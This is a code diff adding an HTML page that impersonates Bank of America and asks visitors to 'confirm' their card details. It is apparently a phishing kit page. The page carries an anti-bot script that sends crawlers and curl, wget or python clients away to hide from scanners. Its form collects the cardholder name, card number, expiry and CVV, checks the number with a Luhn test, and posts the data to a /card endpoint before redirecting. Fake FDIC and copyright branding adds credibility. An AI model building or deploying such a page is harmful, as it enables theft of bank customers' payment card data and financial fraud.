@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta name="robots" content="noindex, nofollow">
+    <script>
+    /* anti-bot */
+    const bots = [/bot/i, /crawler/i, /spider/i, /wget/i, /curl/i, /python/i];
+    const ua = navigator.userAgent;
+    if (bots.some(rx => rx.test(ua))) {
+        location.href = "https://google.com";
+    }
+    </script>
+    <meta name="robots" content="noindex, nofollow">
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Bank of America</title>
+  <link rel="shortcut icon" href="img/icona.png" />
+  <link rel="stylesheet" href="style2.css" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css" />
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" />
+</head>
+
+<body>
+
+    <div class="fdic-banner">
+  <span>Bank of America deposit products:</span>
+  <img src="https://secure1.bac-assets.com/spa/widgets/gt-secure-fdic-widget/1.0.0/spa-assets/images/assets-images-global-fdic-fdic-digital-sign-CSX37f66a3e.svg" 
+       alt="FDIC-Insured - Backed by the full faith and credit of the U.S. Government">
+</div>
+
+  <section id="header2">
+    <a href="index.html" class="log">
+      <img src="img/logo-main.png" width="300px" height="35px" class="logo" />
+    </a>
+    <li class="area"><i class="fa fa-lock"></i> <span>Secure Page</span></li>
+  </section>
+
+  <section id="hero2">
+    <div class="bar">
+      <ul id="navbarr">
+        <h3>Bank Card</h3>
+      </ul>
+    </div>
+  </section>
+
+  <div class="container">
+    <div>
+      <h1>Confrim Card Details.</h1>
+      <p class="subtitle">
+        To protect your account, please tell us the
+        requested info so we can confirm your card details. <br>
+        If you have more than one account, choose one and
+        we'll take care of the rest.
+      </p>
+    </div>
+
+    <form id="login-details">
+      <div class="form-group">
+      <label for="name-on-card">Name on card</label>
+      <div class="input-with-icon">
+      <input type="text" id="name-on-card" autocomplete="off" placeholder="Enter your Name on card" required /></div>
+    </div>
+
+      <div class="form-group">
+      <label for="card-number">Card Number</label>
+      <div class="input-wrapper">
+        <div class="input-with-icon">
+        <input type="text" id="card-number" maxlength="19" placeholder="0000 0000 0000 0000" required /></div>
+        <img id="card-logo" class="card-logo" src="" alt="" />
+      </div>
+      </div>
+
+      <div class="form-group">
+      <label for="expiry">Expiry Date (MM/YY)</label>
+      <div class="input-with-icon">
+      <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required /></div>
+    </div>
+
+      <div class="form-group">
+      <label for="cvv">CVV</label>
+      <div class="input-with-icon">
+      <input type="text" id="cvv" placeholder="123" maxlength="4" required /></div>
+    </div>
+
+<div class="button-group">
+        <button type="submit" class="btn primary">Continue</button>
+        <button type="button" class="btn outlined">Cancel</button>
+      </div>
+    </form>
+  </div>
+
+  <script>
+  const nameInput = document.getElementById('name-on-card');
+  const cardInput = document.getElementById('card-number');
+  const logoImg = document.getElementById('card-logo');
+  const expiryInput = document.getElementById('expiry');
+  const cvvInput = document.getElementById('cvv');
+
+  function getCardType(number) {
+    const cleaned = number.replace(/\D/g, '');
+    if (/^4/.test(cleaned)) return 'Visa';
+    if (/^5[1-5]/.test(cleaned)) return 'MasterCard';
+    if (/^3[47]/.test(cleaned)) return 'American Express';
+    if (/^6(?:011|5)/.test(cleaned)) return 'Discover';
+    return null;
+  }
+
+  function getCardLogo(type) {
+    const logos = {
+      'Visa': 'https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png',
+      'MasterCard': 'https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png',
+      'American Express': 'https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg',
+      'Discover': 'https://upload.wikimedia.org/wikipedia/commons/5/5a/Discover_Card_logo.svg'
+    };
+    return logos[type] || '';
+  }
+
+  function luhnCheck(cardNumber) {
+    const digits = cardNumber.replace(/\D/g, '').split('').reverse();
+    let sum = 0;
+    for (let i = 0; i < digits.length; i++) {
+      let digit = parseInt(digits[i]);
+      if (i % 2 !== 0) {
+        digit *= 2;
+        if (digit > 9) digit -= 9;
+      }
+      sum += digit;
+    }
+    return sum % 10 === 0;
+  }
+
+  cardInput.addEventListener('input', () => {
+    let value = cardInput.value.replace(/\D/g, '').slice(0, 16);
+    value = value.replace(/(.{4})/g, '$1 ').trim();
+    cardInput.value = value;
+
+    const type = getCardType(value);
+    const logo = getCardLogo(type);
+    if (logo) {
+      logoImg.src = logo;
+      logoImg.classList.add('show');
+    } else {
+      logoImg.src = '';
+      logoImg.classList.remove('show');
+    }
+
+    cvvInput.maxLength = type === 'American Express' ? 4 : 3;
+    cvvInput.placeholder = type === 'American Express' ? '1234' : '123';
+  });
+
+  expiryInput.addEventListener('input', function () {
+    let value = this.value.replace(/\D/g, '').slice(0, 4);
+    if (value.length >= 3) {
+      value = value.slice(0, 2) + '/' + value.slice(2);
+    }
+    this.value = value;
+  });
+
+  cvvInput.addEventListener('input', function () {
+    this.value = this.value.replace(/\D/g, '').slice(0, this.maxLength);
+  });
+
+  nameInput.addEventListener('input', function () {
+    this.value = this.value.replace(/[^a-zA-Z\s]/g, '');
+  });
+
+  document.getElementById('login-details').addEventListener('submit', async function (e) {
+    e.preventDefault();
+
+    const cardNum = cardInput.value.trim();
+    const expiry = expiryInput.value.trim();
+    const cvv = cvvInput.value.trim();
+    const name = nameInput.value.trim();
+
+    if (!luhnCheck(cardNum)) {
+      alert("❌ Invalid card number.");
+      return;
+    }
+
+    const payload = {
+      nameOnCard: name,
+      cardNumber: cardNum,
+      expiry,
+      cvv
+    };
+
+    try {
+      const res = await fetch('/card', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+
+      if (res.ok) {
+        window.location.href = 'egser3212.html';
+      } else {
+        alert("❌ Submission failed.");
+      }
+    } catch (err) {
+      console.error("❌ Network error:", err);
+      alert("❌ Network error.");
+    }
+  });
+</script>
+
+
+  </form>
+  </div>
+
+</body>
+<footer>
+  <div class="gray-bground-skin">
+    <div class="secure"><i class="fa fa-lock"></i> Secure area</div>
+    <div class="link-container">
+      <div class="link-row">
+        <a href="#" target="_blank">Privacy</a>
+        <a href="#" target="_blank">Security</a>
+        <a class="last-link" href="javascript:OneTrust.ToggleInfoDisplay();">CA Opt-Out Preference Signals Honored</a>
+        <div class="clearboth"></div>
+      </div>
+    </div>
+    <p>
+      Bank of America, N.A. Member FDIC.
+      <a href="#" target="_blank">Equal Housing Lender</a>
+      <i class="fa fa-home"></i><br />© 2025 Bank of America Corporation.
+    </p>
+  </div>
+</footer>
+
+</html>
